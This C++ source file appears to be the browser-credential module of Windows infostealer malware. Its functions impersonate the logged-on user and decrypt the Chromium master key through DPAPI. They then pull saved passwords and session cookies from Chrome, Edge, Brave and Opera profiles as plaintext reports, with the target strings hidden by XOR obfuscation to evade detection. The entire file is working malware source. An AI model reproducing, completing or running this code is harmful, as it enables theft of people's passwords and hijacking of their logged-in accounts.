#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <wincrypt.h>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#pragma comment(lib, "crypt32.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
        const wchar_t kOsCryptEnc[] = { L'o'^0x4B, L's'^0x1F, L'_'^0x8C, L'c'^0x3E, L'r'^0x4B, L'y'^0x1F, L'p'^0x8C, L't'^0x3E }; // os_crypt
        const wchar_t kEncryptedKeyEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'_'^0x1F, L'k'^0x8C, L'e'^0x3E, L'y'^0x4B }; // encrypted_key
        const wchar_t kLocalStateEnc[] = { L'L'^0x4B, L'o'^0x1F, L'c'^0x8C, L'a'^0x3E, L'l'^0x4B, L' '^0x1F, L'S'^0x8C, L't'^0x3E, L'a'^0x4B, L't'^0x1F, L'e'^0x8C }; // Local State
        const wchar_t kLoginDataEnc[] = { L'L'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L' '^0x1F, L'D'^0x8C, L'a'^0x3E, L't'^0x4B, L'a'^0x1F }; // Login Data
        const wchar_t kCookiesEnc[] = { L'C'^0x4B, L'o'^0x1F, L'o'^0x8C, L'k'^0x3E, L'i'^0x4B, L'e'^0x1F, L's'^0x8C }; // Cookies
        const wchar_t kQueryLoginsEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'o'^0x3E, L'r'^0x4B, L'i'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L'_'^0x1F, L'u'^0x8C, L'r'^0x3E, L'l'^0x4B, L','^0x1F, L' '^0x8C, L'u'^0x3E, L's'^0x4B, L'e'^0x1F, L'r'^0x8C, L'n'^0x3E, L'a'^0x4B, L'm'^0x1F, L'e'^0x8C, L'_'^0x3E, L'v'^0x4B, L'a'^0x1F, L'l'^0x8C, L'u'^0x3E, L'e'^0x4B, L','^0x1F, L' '^0x8C, L'p'^0x3E, L'a'^0x4B, L's'^0x1F, L's'^0x8C, L'w'^0x3E, L'o'^0x4B, L'r'^0x1F, L'd'^0x8C, L'_'^0x3E, L'v'^0x4B, L'a'^0x1F, L'l'^0x8C, L'u'^0x3E, L'e'^0x4B, L' '^0x1F, L'F'^0x8C, L'R'^0x3E, L'O'^0x4B, L'M'^0x1F, L' '^0x8C, L'l'^0x3E, L'o'^0x4B, L'g'^0x1F, L'i'^0x8C, L'n'^0x3E, L's'^0x4B }; // SELECT origin_url, username_value, password_value FROM logins
        const wchar_t kQueryCookiesEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'h'^0x3E, L'o'^0x4B, L's'^0x1F, L't'^0x8C, L'_'^0x3E, L'k'^0x4B, L'e'^0x1F, L'y'^0x8C, L','^0x3E, L' '^0x4B, L'p'^0x1F, L'a'^0x8C, L't'^0x3E, L'h'^0x4B, L','^0x1F, L' '^0x8C, L'i'^0x3E, L's'^0x4B, L'_'^0x1F, L's'^0x8C, L'e'^0x3E, L'c'^0x4B, L'u'^0x1F, L'r'^0x8C, L'e'^0x3E, L','^0x1F, L' '^0x8C, L'e'^0x3E, L'x'^0x4B, L'p'^0x1F, L'i'^0x8C, L'r'^0x3E, L'e'^0x4B, L's'^0x1F, L'_'^0x8C, L'u'^0x3E, L't'^0x4B, L'c'^0x1F, L','^0x1F, L' '^0x8C, L'n'^0x3E, L'a'^0x4B, L'm'^0x1F, L'e'^0x8C, L','^0x3E, L' '^0x4B, L'e'^0x1F, L'n'^0x8C, L'c'^0x3E, L'r'^0x4B, L'y'^0x1F, L'p'^0x8C, L't'^0x3E, L'e'^0x4B, L'd'^0x1F, L'_'^0x8C, L'v'^0x3E, L'a'^0x4B, L'l'^0x1F, L'u'^0x8C, L'e'^0x3E, L' '^0x4B, L'F'^0x1F, L'R'^0x8C, L'O'^0x3E, L'M'^0x4B, L' '^0x1F, L'c'^0x8C, L'o'^0x3E, L'o'^0x4B, L'k'^0x1F, L'i'^0x8C, L'e'^0x3E, L's'^0x4B }; // SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies

        // Browser paths
        const wchar_t kChromePathEnc[] = { L'\\'^0x4B, L'G'^0x1F, L'o'^0x8C, L'o'^0x3E, L'g'^0x4B, L'l'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'C'^0x4B, L'h'^0x1F, L'r'^0x8C, L'o'^0x3E, L'm'^0x4B, L'e'^0x1F, L'\\'^0x8C, L'U'^0x3E, L's'^0x4B, L'e'^0x1F, L'r'^0x8C, L' '^0x3E, L'D'^0x4B, L'a'^0x1F, L't'^0x8C, L'a'^0x3E };
        const wchar_t kChromeBetaPathEnc[] = { L'\\'^0x4B, L'G'^0x1F, L'o'^0x8C, L'o'^0x3E, L'g'^0x4B, L'l'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'C'^0x4B, L'h'^0x1F, L'r'^0x8C, L'o'^0x3E, L'm'^0x4B, L'e'^0x1F, L' '^0x8C, L'B'^0x3E, L'e'^0x4B, L't'^0x1F, L'a'^0x8C, L'\\'^0x3E, L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L' '^0x4B, L'D'^0x1F, L'a'^0x8C, L't'^0x3E, L'a'^0x4B };
        const wchar_t kEdgePathEnc[] = { L'\\'^0x4B, L'M'^0x1F, L'i'^0x8C, L'c'^0x3E, L'r'^0x4B, L'o'^0x1F, L's'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'\\'^0x8C, L'E'^0x3E, L'd'^0x4B, L'g'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L' '^0x4B, L'D'^0x1F, L'a'^0x8C, L't'^0x3E, L'a'^0x4B };
        const wchar_t kBravePathEnc[] = { L'\\'^0x4B, L'B'^0x1F, L'r'^0x8C, L'a'^0x3E, L'v'^0x4B, L'e'^0x1F, L'S'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'w'^0x8C, L'a'^0x3E, L'r'^0x4B, L'e'^0x1F, L'\\'^0x8C, L'B'^0x3E, L'r'^0x4B, L'a'^0x1F, L'v'^0x8C, L'e'^0x3E, L'-'^0x4B, L'B'^0x1F, L'r'^0x8C, L'o'^0x3E, L'w'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L'\\'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L' '^0x1F, L'D'^0x8C, L'a'^0x3E, L't'^0x4B, L'a'^0x1F };
        const wchar_t kOperaPathEnc[] = { L'\\'^0x4B, L'O'^0x1F, L'p'^0x8C, L'e'^0x3E, L'r'^0x4B, L'a'^0x1F, L' '^0x8C, L'S'^0x3E, L'o'^0x4B, L'f'^0x1F, L't'^0x8C, L'w'^0x3E, L'a'^0x4B, L'r'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'O'^0x4B, L'p'^0x1F, L'e'^0x8C, L'r'^0x3E, L'a'^0x4B, L' '^0x1F, L'S'^0x8C, L't'^0x3E, L'a'^0x4B, L'b'^0x1F, L'l'^0x8C, L'e'^0x3E };
        const wchar_t kOperaGxPathEnc[] = { L'\\'^0x4B, L'O'^0x1F, L'p'^0x8C, L'e'^0x3E, L'r'^0x4B, L'a'^0x1F, L' '^0x8C, L'S'^0x3E, L'o'^0x4B, L'f'^0x1F, L't'^0x8C, L'w'^0x3E, L'a'^0x4B, L'r'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'O'^0x4B, L'p'^0x1F, L'e'^0x8C, L'r'^0x3E, L'a'^0x4B, L' '^0x1F, L'G'^0x8C, L'X'^0x3E, L' '^0x4B, L'S'^0x1F, L't'^0x8C, L'a'^0x3E, L'b'^0x4B, L'l'^0x1F, L'e'^0x8C };

        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
            try {
                if (!fs::exists(localStatePath)) {
                    LOG_DEBUG("Local State file not found at " + localStatePath);
                    return {};
                }

                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string tempLocalState = std::string(tempPath) + "ls_" + std::to_string(GetTickCount64());
                if (!CopyFileA(localStatePath.c_str(), tempLocalState.c_str(), FALSE)) {
                    tempLocalState = localStatePath;
                }

                std::ifstream f(tempLocalState);
                if (!f.is_open()) {
                    LOG_DEBUG("Failed to open Local State file (even after copy)");
                    return {};
                }
                nlohmann::json j;
                f >> j;
                if (tempLocalState != localStatePath) DeleteFileA(tempLocalState.c_str());

                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, sizeof(kOsCryptEnc)/sizeof(kOsCryptEnc[0])));
                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, sizeof(kEncryptedKeyEnc)/sizeof(kEncryptedKeyEnc[0])));

                if (!j.contains(os_crypt) || !j[os_crypt].contains(encrypted_key_str)) {
                    LOG_DEBUG("Local State does not contain expected keys");
                    return {};
                }

                std::string encryptedKeyB64 = j[os_crypt][encrypted_key_str];
                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);

                if (encryptedKey.size() < 5) return {};
                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());

                DATA_BLOB in;
                in.pbData = dpapiEncryptedKey.data();
                in.cbData = (DWORD)dpapiEncryptedKey.size();
                DATA_BLOB out;

                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                    LocalFree(out.pbData);
                    LOG_DEBUG("Successfully decrypted master key from " + localStatePath);
                    return masterKey;
                } else {
                    LOG_DEBUG("CryptUnprotectData failed for master key. Error: " + std::to_string(GetLastError()));
                }
            } catch (const std::exception& e) {
                LOG_DEBUG("Exception in GetMasterKey: " + std::string(e.what()));
            } catch (...) {
                LOG_DEBUG("Unknown exception in GetMasterKey");
            }
            return {};
        }

        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
            if (ciphertext.empty()) return "";

            // Modern Chromium: v10/v11/v20 (AES-GCM)
            // v10/v11 starts with 'v1', v20 starts with 'v2'
            if (ciphertext.size() >= 15 && ciphertext[0] == 'v' && (ciphertext[1] == '1' || ciphertext[1] == '2')) {
                try {
                    if (ciphertext.size() < 3 + 12 + 16) {
                        LOG_DEBUG("Ciphertext too short for GCM");
                        return "";
                    }

                    std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                    // Payload is everything after prefix and IV. The last 16 bytes are the tag.
                    std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());

                    if (masterKey.empty()) {
                        LOG_DEBUG("Master key empty, cannot decrypt GCM");
                        return "";
                    }

                    crypto::AesGcm aes(masterKey);
                    std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
                    return std::string(decrypted.begin(), decrypted.end());
                } catch (const std::exception& e) {
                    LOG_DEBUG("AES-GCM Decryption failed: " + std::string(e.what()));
                    return "";
                } catch (...) {
                    LOG_DEBUG("AES-GCM Decryption failed (unknown exception)");
                    return "";
                }
            }

            // Legacy Chromium or others: DPAPI directly
            DATA_BLOB in;
            in.pbData = (BYTE*)ciphertext.data();
            in.cbData = (DWORD)ciphertext.size();
            DATA_BLOB out;

            if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                std::string decrypted((char*)out.pbData, out.cbData);
                LocalFree(out.pbData);
                return decrypted;
            }

            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            CopyFileA(src.c_str(), dest.c_str(), FALSE);
            // Also copy sidecars if they exist (WAL mode)
            std::string wal = src + "-wal";
            std::string shm = src + "-shm";
            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
        }

        void SafeDeleteDatabase(const std::string& path) {
            DeleteFileA(path.c_str());
            DeleteFileA((path + "-wal").c_str());
            DeleteFileA((path + "-shm").c_str());
        }
    }

    std::string DumpChromiumPasswords() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
        if (!impersonated) report += "[!] Impersonation failed.\n";
        report += "BROWSER | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

        char path[MAX_PATH];
        char appDataPath[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            localAppData = path;
        }
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            roamingAppData = appDataPath;
        }
            
        struct BrowserPath {
            std::string name;
            std::string localPath;
            std::string roamingPath;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, sizeof(kChromePathEnc)/sizeof(kChromePathEnc[0]))), ""},
            {"Chrome Beta", localAppData + utils::ws2s(utils::DecryptW(kChromeBetaPathEnc, sizeof(kChromeBetaPathEnc)/sizeof(kChromeBetaPathEnc[0]))), ""},
            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, sizeof(kEdgePathEnc)/sizeof(kEdgePathEnc[0]))), ""},
            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, sizeof(kBravePathEnc)/sizeof(kBravePathEnc[0]))), ""},
            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0])))},
            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0])))}
        };

        for (const auto& browser : browsers) {
            std::string localState;
            if (fs::exists(browser.localPath)) {
                localState = browser.localPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
            }

            if (localState.empty() || !fs::exists(localState)) {
                 // Try roaming if local didn't work (for some configurations)
                 if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
                     std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
                     if (fs::exists(altState)) localState = altState;
                 }
            }

            if (localState.empty() || !fs::exists(localState)) {
                LOG_DEBUG("Local State not found for " + browser.name);
                continue;
            }

            std::vector<BYTE> key = GetMasterKey(localState);
            if (key.empty()) report += "[!] No master key for " + browser.name + "\n";

            // Search for Login Data in both local and roaming paths
            std::vector<std::string> searchPaths;
            if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
            if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);

            for (const auto& searchPath : searchPaths) {
                if (!fs::exists(searchPath)) continue;
                try {
                for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
                    try {
                        const auto& entry = *it;
                        if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, sizeof(kLoginDataEnc)/sizeof(kLoginDataEnc[0])))) {
                            std::string loginData = entry.path().string();
                            
                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());

                            SafeCopyDatabase(loginData, tempDb);

                            sqlite3* db;
                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, sizeof(kQueryLoginsEnc)/sizeof(kQueryLoginsEnc[0])));
                                const char* query = query_str.c_str();
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                                        if (!url_ptr || !user_ptr) continue;

                                        std::string url = url_ptr;
                                        std::string username = user_ptr;
                                        const void* blob = sqlite3_column_blob(stmt, 2);
                                        int blobLen = sqlite3_column_bytes(stmt, 2);
                                        
                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string password = DecryptPassword(encryptedPass, key);

                                            if (!password.empty() && !username.empty()) {
                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                }
                                sqlite3_close(db);
                            } else {
                                if (db) {
                                    LOG_DEBUG("SQLite open failed for " + browser.name + ": " + std::string(sqlite3_errmsg(db)));
                                    sqlite3_close(db);
                                }
                            }
                            SafeDeleteDatabase(tempDb);
                        }
                    } catch (...) {}

                    if (it.depth() > 3) it.disable_recursion_pending();
                }
            } catch (...) {}
        }

        if (impersonated) utils::RevertToSelf();
        return report;
    }

    std::string StealChromiumCookies() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::stringstream resultSS;
        resultSS << "# CHROMIUM COOKIE STEALER RESULTS\n";
        if (!impersonated) resultSS << "# [!] Impersonation failed.\n";
        int cookieCount = 0;

        char path[MAX_PATH];
        char appDataPath[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            localAppData = path;
        }
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            roamingAppData = appDataPath;
        }

        struct BrowserPath {
            std::string name;
            std::string localPath;
            std::string roamingPath;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, sizeof(kChromePathEnc)/sizeof(kChromePathEnc[0]))), ""},
            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, sizeof(kEdgePathEnc)/sizeof(kEdgePathEnc[0]))), ""},
            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, sizeof(kBravePathEnc)/sizeof(kBravePathEnc[0]))), ""},
            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0])))},
            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0])))}
        };

        for (const auto& browser : browsers) {
            std::string localState;
            if (fs::exists(browser.localPath)) {
                localState = browser.localPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
            }

            if (localState.empty() || !fs::exists(localState)) {
                 if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
                     std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
                     if (fs::exists(altState)) localState = altState;
                 }
            }

            if (localState.empty() || !fs::exists(localState)) continue;

            std::vector<BYTE> key = GetMasterKey(localState);

            std::vector<std::string> searchPaths;
            if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
            if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);

            for (const auto& searchPath : searchPaths) {
                if (!fs::exists(searchPath)) continue;
                try {
                for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
                    try {
                        const auto& entry = *it;
                        std::string filename = entry.path().filename().string();

                        if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, sizeof(kCookiesEnc)/sizeof(kCookiesEnc[0])))) {
                            std::string cookiesPath = entry.path().string();

                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());

                            SafeCopyDatabase(cookiesPath, tempDb);

                            sqlite3* db;
                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, sizeof(kQueryCookiesEnc)/sizeof(kQueryCookiesEnc[0])));
                                const char* query = query_str.c_str();
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* cpath = (const char*)sqlite3_column_text(stmt, 1);
                                        int isSecure = sqlite3_column_int(stmt, 2);
                                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                                        const char* name = (const char*)sqlite3_column_text(stmt, 4);

                                        const void* blob = sqlite3_column_blob(stmt, 5);
                                        int blobLen = sqlite3_column_bytes(stmt, 5);

                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string value = DecryptPassword(encryptedVal, key);

                                            if (!value.empty()) {
                                                long long unixExpiry = (expiry / 1000000) - 11644473600LL;
                                                if (unixExpiry < 0) unixExpiry = 0;

                                                resultSS << (host ? host : "") << "\t"
                                                         << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                                         << (cpath ? cpath : "") << "\t"
                                                         << (isSecure ? "TRUE" : "FALSE") << "\t"
                                                         << unixExpiry << "\t"
                                                         << (name ? name : "") << "\t"
                                                         << value << "\n";
                                                cookieCount++;
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                }
                                sqlite3_close(db);
                            }
                            SafeDeleteDatabase(tempDb);
                        }
                    } catch (...) {}

                    if (it.depth() > 3) it.disable_recursion_pending();
                }
            } catch (...) {}
        }

        std::stringstream finalOut;
        finalOut << "# Total Chromium cookies extracted: " << cookieCount << "\n";
        finalOut << resultSS.str();
        if (impersonated) utils::RevertToSelf();
        return finalOut.str();
    }

}
